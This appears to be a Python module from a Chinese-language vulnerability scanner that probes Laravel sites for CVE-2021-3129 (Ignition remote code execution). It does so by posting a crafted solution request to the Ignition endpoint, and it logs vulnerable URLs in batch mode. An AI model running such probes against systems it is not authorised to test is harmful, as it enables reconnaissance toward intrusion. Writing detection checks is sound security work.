#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.reqset import ReqSet
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
urllib3.disable_warnings()

class Cve_2021_3129_Check:
    def run(self,url):
        url2 = url+"/_ignition/execute-solution"
        heaedrs = {
            "Host": url.split("://")[-1],
            "User-Agent":self.headers,
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }
        data = {
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "xxxxxx"
  }
}
        try:
            req = requests.post(url2,headers=heaedrs,json=data,verify=self.ssl,proxies=self.proxy)
            if "file_get_contents(" in req.text:
                OutPrintInfoSuc("Laravel", f'存在Laravel CVE-2021-3129远程命令执行 {url2}')

                if self.batch:
                    with open("./result/laravel_2021_3129.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Laravel", '不存在Laravel CVE-2021-3129远程命令执行')
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Laravel", '不存在Laravel CVE-2021-3129远程命令执行')
            return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("Junper", '开始执行Laravel CVE-2021-3129远程命令执行')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Junper", 'Laravel CVE-2021-3129远程命令执行检测结束')